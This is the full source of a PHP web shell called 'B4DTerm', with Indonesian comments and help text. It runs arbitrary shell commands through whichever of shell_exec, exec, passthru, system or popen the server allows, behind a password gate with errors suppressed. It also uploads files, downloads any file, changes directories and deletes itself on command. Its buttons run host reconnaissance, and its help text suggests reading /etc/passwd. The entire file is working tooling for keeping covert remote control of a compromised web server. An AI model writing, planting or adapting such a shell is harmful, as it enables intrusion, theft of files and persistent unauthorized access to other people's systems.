<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// Konfigurasi Hash (Strict)
$h = '$2y$10$hV98QcCsi2h0xSFSzOOSJuccQTZWjSzydYET4dxZIY0sKHsiFtQyG';

if (isset($_GET['bye'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Auth Logic
if (!isset($_SESSION['l']) || !$_SESSION['l']) {
    if (isset($_POST['p'])) {
        if (password_verify($_POST['p'], $h)) {
            $_SESSION['l'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    // Custom Polished Login Page (Sesuai request)
    die("<!DOCTYPE html><html class='dark'><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>B4DTerm Login</title><script src='https://cdn.tailwindcss.com'></script><style>.bg-terminal{background-color:#000}.border-terminal{border-color:#27272a}.text-accent{color:#10b981}.font-mono{font-family:monospace}</style></head><body class='bg-neutral-950 h-screen flex justify-center items-center font-mono text-xs'><div class='terminal-window bg-terminal border border-terminal rounded-xl shadow-2xl p-6 w-full max-w-sm'><div class='flex items-center gap-2 mb-4 border-b pb-2 border-neutral-800'><div class='w-2 h-2 rounded-full bg-red-500'></div><div class='w-2 h-2 rounded-full bg-yellow-500'></div><div class='w-2 h-2 rounded-full bg-emerald-500'></div><span class='font-bold text-gray-200 ml-2'>B4DTerm</span><span class='text-gray-600 ml-auto'>© Pawline</span></div><div class='text-center mb-6'><h1 class='text-lg font-bold text-accent'>SECURE ACCESS</h1><p class='text-gray-500'>Authentication Required</p></div><form method='post' class='space-y-4'><div class='relative'><span class='absolute left-3 top-1/2 -translate-y-1/2 text-accent font-bold'>$</span><input type='password' name='p' class='w-full bg-neutral-900 border border-neutral-800 text-white pl-7 pr-4 py-2 rounded focus:outline-none focus:border-accent placeholder-neutral-600 text-sm tracking-wide' placeholder='' autofocus></div><button type='submit' class='w-full bg-accent/20 border border-accent/30 text-accent py-2 rounded text-sm font-semibold hover:bg-accent/30 transition-colors'>Gaskeun</button></form><div class='mt-6 text-center text-neutral-600 text-[10px]'>ACCESS AT YOUR OWN RISK</div></div></body></html>");
}

if (!isset($_SESSION['d'])) $_SESSION['d'] = getcwd();

if (isset($_GET['get'])) {
    $f = $_SESSION['d'] . '/' . $_GET['get'];
    if (file_exists($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
}

// Fungsi Probing Method
function _probe_method() {
    $fx = ['shell_exec', 'exec', 'passthru', 'system', 'popen'];
    foreach ($fx as $m) {
        if (function_exists($m)) return $m;
    }
    return 'none';
}

if (isset($_POST['k'])) {
    header('Content-Type: application/json');
    $c = trim($_POST['k']);
    $r = ['o' => '', 'd' => $_SESSION['d'], 'm' => 'none'];

    if ($c === 'self_destruct') {
        if (unlink(__FILE__)) {
            $r['o'] = "System destroyed.";
            session_destroy();
        } else {
            $r['o'] = "Destruct failed.";
        }
        echo json_encode($r);
        exit;
    }

    if (strpos($c, 'cd ') === 0) {
        $n = substr($c, 3);
        chdir($_SESSION['d']);
        if (@chdir($n)) {
            $_SESSION['d'] = getcwd();
            $r['d'] = $_SESSION['d'];
        } else {
            // Error message sesuai request
            $r['o'] = "Path tidak ditemukan."; 
            $r['e'] = true;
        }
        echo json_encode($r);
        exit;
    }

    chdir($_SESSION['d']);
    $o = '';
    $fx = ['shell_exec', 'exec', 'passthru', 'system', 'popen'];
    foreach ($fx as $m) {
        if (function_exists($m)) {
            $r['m'] = $m; 
            if ($m == 'exec') { @exec($c." 2>&1", $a); $o = implode("\n", $a); }
            elseif ($m == 'shell_exec') { $o = @shell_exec($c." 2>&1"); }
            elseif ($m == 'passthru' || $m == 'system') { ob_start(); @$m($c." 2>&1"); $o = ob_get_clean(); }
            elseif ($m == 'popen') { $h_p = @popen($c, 'r'); if($h_p){ while(!feof($h_p)) $o.=fread($h_p,1024); pclose($h_p); } }
            break;
        }
    }
    
    // Logic untuk Silent Success Feedback
    if (empty($o) && !isset($r['e']) && $c !== 'self_destruct' && !strpos($c, 'cd ') && !strpos($c, 'help')) {
        $r['s'] = true; 
    }

    $r['o'] = empty($o) ? "" : $o;
    echo json_encode($r);
    exit;
}

if (isset($_FILES['f'])) {
    $t = $_SESSION['d'] . '/' . basename($_FILES['f']['name']);
    $s = move_uploaded_file($_FILES['f']['tmp_name'], $t);
    echo json_encode(['s' => $s, 'path' => $t]);
    exit;
}

$probe = _probe_method();
?>
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>B4DTerm by Pawline</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
.g{background:rgba(10,10,10,0.9);backdrop-filter:blur(10px)}
</style>
</head>
<body class="bg-neutral-950 flex items-center justify-center h-[100dvh] p-2 sm:p-6 text-gray-400 font-mono text-xs overflow-hidden">

<div class="terminal-window bg-black border border-neutral-800 rounded-xl shadow-2xl flex flex-col w-full max-w-7xl h-full sm:h-[90dvh]">

    <header class="h-10 border-b border-white/10 flex items-center justify-between px-3 bg-neutral-900/50 shrink-0 rounded-t-xl">
        <div class="flex items-center gap-2">
            <div class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
            <span class="font-bold text-gray-200">B4DTerm V1.0</span> <span class="text-xs text-gray-600">© Pawline</span>
        </div>
        <div class="flex gap-3">
            <span class="text-gray-600 hidden sm:block"><?= php_uname('s') ?></span>
            <a href="?bye" class="text-red-500 hover:text-red-400 font-bold">LOGOUT</a>
        </div>
    </header>

    <main id="tm" class="flex-1 overflow-hidden relative flex flex-col p-2">
        <div id="out" class="flex-1 overflow-y-auto overflow-x-hidden pb-2 space-y-1">
            <div class="text-gray-600 mb-4">PID: <?= getmypid() ?></div>
            <div id="status" class="text-emerald-500 font-semibold text-xs mb-2"></div>
        </div>
    </main>

    <footer class="bg-black border-t border-white/10 z-20 shrink-0 rounded-b-xl">
        <div id="up" class="hidden bg-neutral-900 p-2 border-b border-white/5 flex gap-2">
            <input type="file" id="fi" class="w-full text-xs text-gray-400 file:bg-emerald-900 file:text-emerald-400 file:border-0 file:px-2 file:py-1 file:rounded cursor-pointer">
            <button id="ub" class="bg-emerald-600 text-white px-3 py-1 rounded hover:bg-emerald-500">UP</button>
        </div>

        <div class="flex overflow-x-auto gap-1 p-1 bg-neutral-900/30 no-scrollbar">
            <button onclick="x('ls -la --color=never')" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit transition">LS</button>
            <button onclick="x('id; uname -a; pwd')" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit transition">INFO</button>
            <button onclick="x('ps aux | head -10')" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit transition">PROC</button>
            <button onclick="x('netstat -anpt')" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit transition">NET</button>
            <button onclick="tg()" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit text-emerald-500 font-bold">UPLD</button>
            <button onclick="x('help')" class="px-2 py-1 bg-white/5 hover:bg-white/10 rounded min-w-fit text-yellow-500 font-bold">HELP</button>
            <button onclick="if(confirm('Destroy?'))x('self_destruct')" class="px-2 py-1 bg-red-900/20 text-red-500 hover:bg-red-900/40 rounded min-w-fit">KILL</button>
        </div>

        <div class="p-2 g rounded-b-xl">
            <div class="flex justify-between text-[10px] text-gray-500 mb-1 px-1">
                <div class="max-w-[80%] overflow-x-auto whitespace-nowrap pr-2">
                    <span id="wd" class="text-emerald-600"><?= $_SESSION['d'] ?></span>
                </div>
                <span>PHP <?= phpversion() ?></span>
            </div>
            <div class="relative">
                <span class="absolute left-2 top-2 text-emerald-500 font-bold">$</span>
                <input id="ci" class="w-full bg-neutral-900 border border-white/10 rounded pl-6 pr-10 py-2 focus:outline-none focus:border-emerald-500/50 text-gray-200 placeholder-gray-700 transition-colors" autocomplete="off" spellcheck="false" placeholder="...">
                <button id="sb" class="absolute right-2 top-2 text-gray-500 hover:text-white transition">></button>
            </div>
        </div>
    </footer>
</div>

<script>
const O=document.getElementById('out'), I=document.getElementById('ci'), W=document.getElementById('wd'), S=document.getElementById('status');
const tg=()=>document.getElementById('up').classList.toggle('hidden');
const probeMethod = '<?= $probe ?>';
let isFirstCmd = true;

let history = [];
let histIdx = -1;

const helpText = `
B4DTerm V1.0 Usage Guide (© Pawline):

1. EKSEKUSI PERINTAH:
   > Ketik perintah shell (mis: ls -la, cat /etc/passwd) dan tekan Enter.
   > Gunakan **Panah Atas/Bawah** pada keyboard untuk menelusuri riwayat perintah.

2. NAVIGASI:
   > Gunakan 'cd /path/dir' untuk pindah direktori.
   > Direktori saat ini ada di bagian bawah (dapat digeser).

3. MANAJEMEN FILE:
   > UPLOAD: Klik tombol 'UPLD', pilih file, dan tekan 'UP'. **Path lengkap** file akan ditampilkan.
   > DOWNLOAD: Ketik 'dl filename.ext' (mis: dl backup.zip) untuk mengunduh.

4. QUICK ACTIONS:
   > LS, INFO, PROC, NET: Tombol pintas untuk perintah umum.
   > KILL: Menjalankan 'self_destruct' untuk menghapus script ini (BAHAYA!).

5. INFO SISTEM:
   > Metode eksekusi yang digunakan (mis: shell_exec) akan ditampilkan setelah perintah pertama.
   > Perintah yang berhasil namun tidak menghasilkan output akan memberikan feedback sukses.
`;

const typeWriter = (text, element, callback, speed = 25) => {
    let i = 0;
    element.innerHTML = '';
    function type() {
        if (i < text.length) {
            element.innerHTML += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else if (callback) {
            callback();
        }
    }
    type();
};

const animateLoad = () => {
    typeWriter("Connecting to remote system...", S, () => {
        S.innerHTML = 'Connecting to remote system... [ <span class="text-white">OK</span> ]';
        const d2 = document.createElement('div');
        d2.className = 'text-emerald-500 font-semibold text-xs mb-4 mt-2';
        O.appendChild(d2);
        typeWriter(`Connected.`, d2, () => {
            I.focus();
        }, 30);
    }, 40);
};

const lg = (t, m, e=0, type='norm') => {
    const d=document.createElement('div');
    if(m){
        d.innerHTML=`<div class="text-[10px] text-gray-600 mt-2">root@local</div><div class="flex gap-2"><span class="text-emerald-500">$</span><span class="text-white">${t}</span></div>`;
    } else {
        d.className = `pl-3 border-l-2 ${e?'border-red-500 text-red-400':'border-white/20 text-gray-300'} whitespace-pre overflow-x-auto py-1 font-mono text-[11px] leading-snug`;
        d.innerText = t;
    }
    O.appendChild(d);
    O.scrollTop=O.scrollHeight;
}

const x = async(c) => {
    if(!c) c=I.value; if(!c) return;
    
    if (c !== 'clear' && c !== 'help' && !c.startsWith('dl ') && history[history.length - 1] !== c) {
        history.push(c);
    }
    histIdx = history.length;
    
    if(c=='clear'){ O.innerHTML=''; lg('PID: <?= getmypid() ?>',0,0,'pid'); animateLoad(); I.value=''; return; }
    if (c === 'help') {
        lg(c, 1);
        lg(helpText, 0, 0); 
        I.value = ''; I.focus(); return;
    }
    if(c.startsWith('dl ')){ window.location='?get='+encodeURIComponent(c.substring(3)); I.value=''; return; }
    
    lg(c,1); I.value=''; I.disabled=1;
    
    try {
        const f=new FormData(); f.append('k',c);
        const r=await fetch('',{method:'POST',body:f}).then(res=>res.json());
        
        if(r.o) lg(r.o,0,r.e);
        else if (r.s && !r.e) {
             lg("Command executed successfully.", 0, 0);
        }

        if(r.d) W.innerText=r.d;

        if (isFirstCmd && r.m && r.m !== 'none') {
            const m_d = document.createElement('div');
            m_d.className = 'text-emerald-500 text-[10px] pl-3 mb-2 font-semibold';
            O.appendChild(m_d);
            typeWriter(`Execution Method: ${r.m} Enabled`, m_d);
            isFirstCmd = false;
        }

    } catch(e){ lg('Request Failed',0,1); }
    I.disabled=0; I.focus();
}

document.getElementById('sb').onclick=()=>x();

I.onkeydown=e=>{
    if(e.key=='Enter') x();
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx > 0) I.value = history[--histIdx];
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (histIdx < history.length - 1) I.value = history[++histIdx];
        else { histIdx = history.length; I.value = ''; }
    }
};

document.getElementById('ub').onclick=async()=>{
    const f=document.getElementById('fi').files[0];
    if(!f) return;
    const d=new FormData(); d.append('f',f);
    
    const originalText = document.getElementById('ub').innerText;
    document.getElementById('ub').innerText = '...';
    document.getElementById('ub').disabled = true;

    try {
        const r=await fetch('',{method:'POST',body:d}).then(res=>res.json());
        if (r.s && r.path) {
            lg(`Upload Success: ${f.name} => ${r.path}`, 0);
        } else {
            lg(`Upload Failed. Check permissions.`, 0, 1);
        }
    } catch(e) {
        lg('Upload Network Error', 0, 1);
    } finally {
        document.getElementById('ub').innerText = originalText;
        document.getElementById('ub').disabled = false;
        tg();
    }
};

window.onload = () => animateLoad();
</script>
</body>
</html>